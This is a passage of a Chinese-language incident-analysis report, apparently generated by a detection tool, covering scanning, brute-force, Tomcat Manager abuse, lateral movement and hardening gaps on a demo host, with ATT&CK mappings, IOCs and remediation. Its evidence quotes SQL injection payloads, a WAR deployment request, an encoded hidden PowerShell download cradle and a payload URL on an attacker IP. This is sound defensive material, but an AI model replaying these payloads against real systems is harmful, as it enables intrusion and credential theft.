### 41. [中危] 探测敏感文件/备份（198.51.100.23）

- 规则：`WEB-SENSITIVE_FILE`
- ATT&CK：T1083 文件和目录发现
- 战术：初始访问
- ip：198.51.100.23
- 次数：36
- 时间范围：2026-11-20 15:18:18 ~ 2026-11-20 15:53:18

来自 198.51.100.23 的 36 条请求命中“探测敏感文件/备份”特征，其中 0 条返回 2xx/3xx 状态码。

**证据：**

- `2026-11-20 15:18:18 GET /admin/backup0.zip -> 404 UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
- `2026-11-20 15:19:18 GET /admin/backup1.zip -> 404 UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
- `2026-11-20 15:20:18 GET /admin/backup2.zip -> 404 UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
- `2026-11-20 15:21:18 GET /admin/backup3.zip -> 404 UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
- `2026-11-20 15:22:18 GET /admin/backup4.zip -> 404 UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
- `2026-11-20 15:23:18 GET /admin/backup5.zip -> 404 UA=Mozilla/5.0 (Windows NT 10.0; Win64; x64)`

**建议：** 核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。

### 42. [中危] Tomcat 路径枚举：198.51.100.23（33 个 404 路径）

- 规则：`TOMCAT-ENUM`
- ATT&CK：T1595.003 目录扫描
- 战术：发现
- ip：198.51.100.23
- 次数：33

来源 198.51.100.23 触发 33 次 404，涉及 33 个不同路径。

**证据：**

- `2026-11-20 06:58:18 /admin/backup0.zip -> 404`
- `2026-11-20 06:59:18 /admin/backup1.zip -> 404`
- `2026-11-20 07:00:18 /admin/backup2.zip -> 404`
- `2026-11-20 07:01:18 /admin/backup3.zip -> 404`
- `2026-11-20 07:02:18 /admin/backup4.zip -> 404`
- `2026-11-20 07:03:18 /admin/backup5.zip -> 404`

**建议：** 封禁或限速来源；移除示例应用/管理控制台，部署 WAF。

### 43. [中危] 探测敏感文件/备份（198.51.100.23）

- 规则：`TOMCAT-SENSITIVE_FILE`
- ATT&CK：T1190 利用面向公众的应用
- 战术：初始访问
- ip：198.51.100.23
- 次数：33
- 时间范围：2026-11-20 06:58:18 ~ 2026-11-20 07:44:18

来自 198.51.100.23 的 33 条 Tomcat 请求命中“探测敏感文件/备份”，其中 0 条返回 2xx/3xx。

**证据：**

- `2026-11-20 06:58:18 GET /admin/backup0.zip -> 404 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 06:59:18 GET /admin/backup1.zip -> 404 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 07:00:18 GET /admin/backup2.zip -> 404 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 07:01:18 GET /admin/backup3.zip -> 404 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 07:02:18 GET /admin/backup4.zip -> 404 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 07:03:18 GET /admin/backup5.zip -> 404 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`

**建议：** 核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。

### 44. [中危] 访问 Tomcat Manager 管理控制台（203.0.113.66）

- 规则：`TOMCAT-MANAGER`
- ATT&CK：T1078 有效账户
- 战术：初始访问
- ip：203.0.113.66
- 次数：13
- 时间范围：2026-11-20 06:38:18 ~ 2026-11-20 07:43:18

来自 203.0.113.66 的 13 条 Tomcat 请求命中“访问 Tomcat Manager 管理控制台”，其中 1 条返回 2xx/3xx。

**证据：**

- `2026-11-20 06:38:18 GET /manager/html -> 401 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 06:39:18 GET /manager/html -> 401 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 06:40:18 GET /manager/html -> 401 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 06:41:18 GET /manager/html -> 401 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 06:42:18 GET /manager/html -> 401 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`
- `2026-11-20 06:43:18 GET /manager/html -> 401 UA=Mozilla/5.0+(Windows+NT+10.0;+Win64;+x64)`

**建议：** 核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。

### 45. [中危] NTLM 认证失败集中：WIN-DEMO02

- 规则：`AUTH-014`
- ATT&CK：T1110 暴力破解 / T1550 传递哈希
- 战术：凭据访问
- workstation：WIN-DEMO02
- 次数：12
- 时间范围：2026-11-20 12:38:18 ~ 2026-11-20 12:38:27

工作站 WIN-DEMO02 产生 12 次 NTLM 认证失败，可能是口令喷洒、过期凭据或 Pass-the-Hash 尝试。

**证据：**

- `2026-11-20 12:38:18  EventID=4776 | TargetUserName=svc_sql; Status=0xc000006a`
- `2026-11-20 12:38:19  EventID=4776 | TargetUserName=svc_sql; Status=0xc000006a`
- `2026-11-20 12:38:20  EventID=4776 | TargetUserName=svc_sql; Status=0xc000006a`
- `2026-11-20 12:38:21  EventID=4776 | TargetUserName=svc_sql; Status=0xc000006a`
- `2026-11-20 12:38:22  EventID=4776 | TargetUserName=svc_sql; Status=0xc000006a`

**建议：** 定位来源主机，排查恶意进程与保存的凭据；启用 NTLM 审核与受保护用户组，逐步禁用 NTLM。

### 46. [中危] 登录失败集中：203.0.113.66（12 次）

- 规则：`AUTH-001`
- ATT&CK：T1110.001 暴力破解
- 战术：凭据访问
- ip：203.0.113.66
- 次数：12
- 时间范围：2026-11-20 11:18:18 ~ 2026-11-20 11:30:35

来源 203.0.113.66 在日志窗口内触发 12 次登录失败，10 分钟内峰值 9 次，涉及 1 个账户。符合暴力破解或口令猜测特征。

**证据：**

- `失败 12 次，10 分钟窗口峰值 9 次`
- `目标账户 Top: Administrator(12)`
- `2026-11-20 11:18:18  EventID=4625 | TargetUserName=Administrator; LogonType=10; Status=0xc000006d; SubStatus=0xc000006a; WorkstationName=KALI-ATTACK`
- `2026-11-20 11:19:25  EventID=4625 | TargetUserName=Administrator; LogonType=10; Status=0xc000006d; SubStatus=0xc000006a; WorkstationName=KALI-ATTACK`
- `2026-11-20 11:20:32  EventID=4625 | TargetUserName=Administrator; LogonType=10; Status=0xc000006d; SubStatus=0xc000006a; WorkstationName=KALI-ATTACK`
- `2026-11-20 11:21:39  EventID=4625 | TargetUserName=Administrator; LogonType=10; Status=0xc000006d; SubStatus=0xc000006a; WorkstationName=KALI-ATTACK`
- `2026-11-20 11:22:46  EventID=4625 | TargetUserName=Administrator; LogonType=10; Status=0xc000006d; SubStatus=0xc000006a; WorkstationName=KALI-ATTACK`
- `2026-11-20 11:23:53  EventID=4625 | TargetUserName=Administrator; LogonType=10; Status=0xc000006d; SubStatus=0xc000006a; WorkstationName=KALI-ATTACK`

**建议：** 核查该来源 IP 是否可信；启用账户锁定策略与登录失败阈值告警，在边界防火墙封禁来源 IP，并对被尝试账户强制改密、启用 MFA。

### 47. [中危] 自动化扫描器/工具特征（198.51.100.23）

- 规则：`WEB-SCANNER_UA`
- ATT&CK：T1595 主动扫描
- 战术：初始访问
- ip：198.51.100.23
- 次数：6
- 时间范围：2026-11-20 16:38:18 ~ 2026-11-20 17:19:18

来自 198.51.100.23 的 6 条请求命中“自动化扫描器/工具特征”特征，其中 1 条返回 2xx/3xx 状态码。

**证据：**

- `2026-11-20 16:38:18 GET /old/site0.php -> 404 UA=Nmap Scripting Engine`
- `2026-11-20 16:39:18 GET /old/site1.php -> 404 UA=Nmap Scripting Engine`
- `2026-11-20 16:40:18 GET /old/site2.php -> 404 UA=Nmap Scripting Engine`
- `2026-11-20 16:41:18 GET /old/site3.php -> 404 UA=Nmap Scripting Engine`
- `2026-11-20 17:18:18 GET /Product.aspx?id=1' UNION SELECT username,password FROM users-- -> 500 UA=sqlmap/1.7.2#stable (https://sqlmap.org)`
- `2026-11-20 17:19:18 GET /Product.aspx?id=1 AND SLEEP(5) -> 200 UA=sqlmap/1.7.2#stable (https://sqlmap.org)`

**建议：** 核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。

### 48. [中危] 访问管理共享 ADMIN$：helpdesk_svc

- 规则：`LATERAL-SHARE`
- ATT&CK：T1021.002 SMB/Windows 管理共享
- 战术：横向移动
- share：admin$
- user：helpdesk_svc
- 次数：3
- 时间范围：2026-11-20 12:20:18 ~ 2026-11-20 12:20:20

账户 helpdesk_svc 访问管理共享 ADMIN$（3 次），攻击者常通过 ADMIN$/C$ 投放工具、复制文件或执行远程命令。

**证据：**

- `2026-11-20 12:20:18  EventID=5145 | SubjectUserName=helpdesk_svc; ShareName=ADMIN$; RelativeTargetName=svchost.exe; IpAddress=10.0.0.77`
- `2026-11-20 12:20:19  EventID=5145 | SubjectUserName=helpdesk_svc; ShareName=ADMIN$; RelativeTargetName=svchost.exe; IpAddress=10.0.0.77`
- `2026-11-20 12:20:20  EventID=5145 | SubjectUserName=helpdesk_svc; ShareName=ADMIN$; RelativeTargetName=svchost.exe; IpAddress=10.0.0.77`

**建议：** 核对访问来源与操作人员；限制管理共享访问，启用 SMB 签名，排查共享目录中新增的可执行文件。

### 49. [中危] 公网 IP 远程桌面登录：203.0.113.66

- 规则：`AUTH-005`
- ATT&CK：T1021.001 远程桌面协议
- 战术：横向移动
- ip：203.0.113.66
- 次数：2
- 时间范围：2026-11-20 11:32:18 ~ 2026-11-20 11:32:20

检测到来自公网地址 203.0.113.66 的 2 次 RDP 会话，涉及账户 Administrator。若该主机本不应直接暴露 RDP，则登录来源高度可疑。

**证据：**

- `2026-11-20 11:32:18 用户=Administrator 地址=203.0.113.66 事件=4624`
- `2026-11-20 11:32:20 用户=WIN-DEMO01\Administrator 地址=203.0.113.66 事件=21`

**建议：** 确认 RDP 是否必须对公网开放；建议通过 VPN/堡垒机访问，启用 NLA 与 MFA，限制来源 IP，并核查该来源的登录后行为。

### 50. [中危] Guest 账户已启用

- 规则：`POST-GUEST`
- ATT&CK：T1078 有效账户
- 战术：初始访问
- 次数：1

Guest 账户启用会扩大未授权访问面，且通常无法审计到具体使用者。

**建议：** 禁用 Guest 账户并重命名，检查匿名访问相关策略。

### 51. [中危] LSA 保护（RunAsPPL）未启用

- 规则：`POST-LSA`
- ATT&CK：T1003.001 LSASS 内存
- 战术：凭据访问
- 次数：1

未启用 LSA 保护时，管理员权限进程可直接读取 LSASS 内存并提取凭据哈希。

**建议：** 启用 RunAsPPL 与 Credential Guard（需评估兼容性），限制本地管理员数量。

### 52. [中危] SMBv1 协议已启用

- 规则：`POST-SMB1`
- ATT&CK：T1210 利用远程服务
- 战术：横向移动
- 次数：1

SMBv1 存在 EternalBlue 等已知高危漏洞，且缺乏现代安全特性。

**建议：** 禁用 SMBv1（Set-SmbServerConfiguration -EnableSMB1Protocol $false），并评估依赖。

### 53. [中危] Tomcat Manager 控制台可访问

- 规则：`TOMCAT-MANAGER-EXPOSED`
- ATT&CK：T1078 有效账户
- 战术：初始访问
- 次数：1

检测到 1 次 Manager 控制台成功访问，涉及 1 个来源。Manager 可直接部署 WAR 获取服务器权限，不应暴露给非运维网段。

**证据：**

- `2026-11-20 07:43:18 203.0.113.66 /manager/text/deploy?path=/ROOT&war=file:/tmp/upload/ROOT.war -> 200`

**建议：** 删除默认 manager/host-manager 应用或限制来源 IP，使用强口令并启用 HTTPS。

### 54. [中危] Tomcat 出现内存溢出

- 规则：`TOMCAT-OOM`
- ATT&CK：T1499 端点拒绝服务
- 战术：影响
- 次数：1

Catalina 日志出现 1 次 OutOfMemoryError，可能导致服务不可用或被用于拒绝服务。

**建议：** 检查堆内存配置与异常请求，保留堆转储分析是否存在内存马。

### 55. [中危] Tomcat 版本已停止维护：8.5.24

- 规则：`TOMCAT-VERSION`
- ATT&CK：T1190 利用面向公众的应用
- 战术：加固配置
- 次数：1

当前 Tomcat 版本 8.5.24 已停止安全更新，存在多个已知反序列化/JNDI 漏洞。

**证据：**

- `Server version: 8.5.24`

**建议：** 升级到受支持的 Tomcat 9.0/10.1/11 版本，并移除示例应用。

### 56. [中危] 可疑命令执行：PowerShell 隐藏窗口/绕过执行策略

- 规则：`EXEC-POWERSHELL_HIDDEN`
- ATT&CK：T1059.001 PowerShell
- 战术：执行
- 次数：1
- 时间范围：2026-11-20 11:58:18 ~ 2026-11-20 11:58:18

检测到 1 次与“PowerShell 隐藏窗口/绕过执行策略”匹配的命令执行，命令内容与进程链已记录在证据中。

**证据：**

- `命令: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA`
- `执行账户: helpdesk_svc(1)`

**建议：** 确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。

### 57. [中危] 系统审核策略被修改（1 次）

- 规则：`DEF-AUDIT`
- ATT&CK：T1562.002 禁用 Windows 事件日志
- 战术：防御规避
- 次数：1
- 时间范围：2026-11-20 12:05:18 ~ 2026-11-20 12:05:18

审核策略变更会直接影响日志可见性，攻击者可能通过降低审核级别来隐藏行为。

**证据：**

- `操作者: helpdesk_svc(1)`
- `2026-11-20 12:05:18 [security] 4719 Microsoft-Windows-Security-Auditing | SubjectUserName=helpdesk_svc`

**建议：** 核对变更内容与操作者，确保登录、进程创建、账户管理等关键审计保持启用。

### 58. [中危] 部分防火墙配置文件未启用

- 规则：`POST-FIREWALL`
- ATT&CK：T1562.004 禁用或修改系统防火墙
- 战术：防御规避
- 次数：1

存在未启用的 Windows 防火墙配置文件，主机暴露面增大。

**证据：**

- `未启用: Private`

**建议：** 启用所有配置文件的防火墙，并按最小必要原则配置入站规则。

### 59. [低危] 大量非法请求目标（扫描器特征）

- 规则：`TOMCAT-BAD-REQUEST`
- ATT&CK：T1595 主动扫描
- 战术：发现
- 次数：5

检测到 5 次非法请求目标告警，通常来自漏洞扫描器。

**建议：** 封禁来源，检查 AccessLogValve 是否记录完整请求。

### 60. [低危] 本地管理员组成员过多（6 个）

- 规则：`POST-ADMINS`
- ATT&CK：T1078.003 本地账户
- 战术：权限提升
- 次数：1

管理员组成员越多，凭据泄露后的影响面越大，也难以追溯操作者。

**证据：**

- `成员: CORP\Administrator, CORP\helpdesk_svc, CORP\svc_backup, CORP\itadmin, CORP\sqlsvc, CORP\websvc`

**建议：** 清理不必要的管理员成员，使用受控的运维账户与 LAPS 管理本地口令。

### 61. [低危] 特殊特权指派基线（非系统账户）

- 规则：`AUTH-016`
- ATT&CK：T1134 访问令牌操纵
- 战术：权限提升
- 次数：1
- 时间范围：2026-11-20 11:32:23 ~ 2026-11-20 11:32:23

以下非系统账户在登录时被分配特殊特权。管理员登录通常会产生该事件，此处仅作基线记录，需结合账户授权范围判断是否异常。

**证据：**

- `账户与次数: Administrator(1)`

**建议：** 定期复核管理员组成员与特权指派，遵循最小权限原则。

## IOC 清单

### ip

- `203.0.113.66`
- `198.51.100.23`

### url

- `http://203.0.113.66/payload.ps1`

### file

- `C:\Users\Public\svchost.exe`

### user

- `Administrator`
- `svc_sql`
- `helpdesk_svc`
- `svc_backup`

### service

- `PSEXESVC`
- `WinUpdSvc`

### task

- `\Microsoft\Windows\UpdateOrchestrator\SystemCheck`

### user_agent

- `Nmap Scripting Engine`
- `sqlmap/1.7.2#stable (https://sqlmap.org)`

## 处置建议

- **[严重] 疑似爆破成功：203.0.113.66 -> Administrator**：立即隔离该账户：强制改密、撤销会话与令牌、检查该来源的后续操作（进程创建、服务安装、计划任务、数据访问），并保留证据用于溯源。
- **[严重] JSP WebShell 访问特征（203.0.113.66）**：核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。
- **[严重] WebShell 访问/上传特征（198.51.100.23）**：核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。
- **[严重] Defender 实时保护未开启**：确认主机是否有正常运行的第三方杀软；如无，请立即启用 Defender 实时保护与云保护。
- **[严重] Defender 检出恶意软件：Trojan:Win32/Beacon**：确认处置结果并全盘扫描；提取被检出文件哈希与路径作为 IOC，排查其落地方式（下载、U 盘、邮件附件）与执行后的网络行为。
- **[严重] Log4Shell (CVE-2021-44228) 利用尝试（198.51.100.23）**：核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。
- **[严重] Tomcat 日志出现 jndi 相关异常**：提取完整堆栈与对应请求，排查 webapps 是否被植入后门；升级 Tomcat 与 JDK。
- **[严重] WAR 包部署/上传行为（203.0.113.66）**：核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。
- **[严重] 可疑命令执行：删除卷影副本/启动恢复项（典型勒索软件前置动作）**：确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。
- **[严重] 可疑命令执行：清除日志/审计记录等反取证操作**：确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。
- **[严重] 后门账户提权：新建账户 helpdesk_svc 加入 Administrators**：立即核实变更授权；若为异常变更，将成员移出并禁用账户，审查操作者来源与其他管理员组变更。
- **[严重] 审核日志被清除**：立即启用日志转发（WEF/SIEM）并离线保全现有日志；核查清除操作者与登录来源，清除行为本身应视为高风险入侵迹象。
- **[严重] 服务安装：PSEXESVC**：核实服务来源与签名；非授权服务应立即停止并删除，同时排查该服务的可执行文件哈希与网络连接。
- **[严重] 服务安装：WinUpdSvc**：核实服务来源与签名；非授权服务应立即停止并删除，同时排查该服务的可执行文件哈希与网络连接。
- **[严重] 通过 PUT 写入 JSP（CVE-2017-12615 特征）**：确认 webapps 目录是否新增 JSP；设置 readonly=true，升级 Tomcat 至修复版本。
- **[高危] Manager 认证爆破：203.0.113.66（12 次 401/403）**：立即封禁来源，检查 manager-users.xml 与访问日志中是否有成功登录，启用强口令/MFA。
- **[高危] 疑似 Kerberoasting：svc_sql 请求 6 个 RC4 服务票据**：禁用 RC4，改用 AES；为服务账户使用托管服务账户（gMSA）并定期轮换口令；排查票据请求来源。
- **[高危] SQL 注入尝试（198.51.100.23）**：核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。
- **[高危] AlwaysInstallElevated 已启用**：删除 HKLM/HKCU 下 AlwaysInstallElevated 策略值。
- **[高危] Defender 存在排除项**：逐项确认排除项业务必要性，删除无法说明来源的排除路径。
- **[高危] PowerShell 可疑脚本块：脚本块下载远程内容**：提取完整脚本块进行人工分析；启用约束语言模式与 AppLocker/WDAC，限制 PowerShell 仅允许签名脚本。
- **[高危] PowerShell 可疑脚本块：脚本块使用动态执行（IEX）**：提取完整脚本块进行人工分析；启用约束语言模式与 AppLocker/WDAC，限制 PowerShell 仅允许签名脚本。
- **[高危] SQL 注入尝试（198.51.100.23）**：核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。
- **[高危] WDigest 明文凭据缓存已启用**：设置 HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential=0 并重启。
- **[高危] 从临时目录部署 Web 应用（可疑）**：核对部署来源与 WAR 内容，删除非授权应用并检查 webapps 目录。
- **[高危] 创建本地用户账户：helpdesk_svc**：核对变更工单与操作人员；非授权变更应立即回滚，并检查该账户/操作者此后的登录与提权行为。
- **[高危] 创建本地用户账户：svc_backup**：核对变更工单与操作人员；非授权变更应立即回滚，并检查该账户/操作者此后的登录与提权行为。
- **[高危] 匿名网络登录（ANONYMOUS LOGON）**：禁用匿名访问与空会话，限制 SMB/RPC 暴露面，检查共享权限与 NTLM 中继防护（SMB 签名/EPA）。
- **[高危] 可疑命令执行：PowerShell 使用 Base64 编码命令（常见于无文件攻击）**：确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。
- **[高危] 可疑命令执行：写入注册表 Run 自启动项（持久化）**：确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。
- **[高危] 可疑命令执行：创建本地用户账户（持久化）**：确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。
- **[高危] 可疑命令执行：账户/域内侦察命令**：确认执行者与业务用途；若为攻击行为，立即隔离主机、采集进程内存与磁盘证据，并重置在该主机使用过的凭据。
- **[高危] 尝试访问 WEB-INF/META-INF 受保护目录（198.51.100.23）**：核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。
- **[高危] 新建账户被登录：helpdesk_svc**：立即核实账户用途与登录来源；非授权账户应禁用、删除并重置相关凭据。
- **[高危] 服务启动类型变更：WinUpdSvc（手动 -> 自动）**：确认变更来源；非授权变更应恢复原启动类型并排查服务映像。
- **[高危] 计划任务创建：\Microsoft\Windows\UpdateOrchestrator\SystemCheck**：核对任务来源与执行命令；非授权任务应删除，并检查任务使用的可执行文件与账户权限。
- **[高危] 路径穿越尝试（198.51.100.23）**：核查对应请求与响应内容；对成功请求立即排查是否已落地 WebShell 或执行命令，并部署 WAF、限制目录执行权限、及时打补丁。
- **[高危] 路径穿越尝试（198.51.100.23）**：核查请求与响应；对成功利用立即检查 webapps 目录是否新增 JSP/WAR，封禁来源 IP，升级 Tomcat 并限制 Manager 访问。
- **[高危] 远程桌面已启用但未要求网络级身份验证（NLA）**：启用 NLA（UserAuthentication=1），通过 VPN/堡垒机限制访问来源，并启用 MFA。
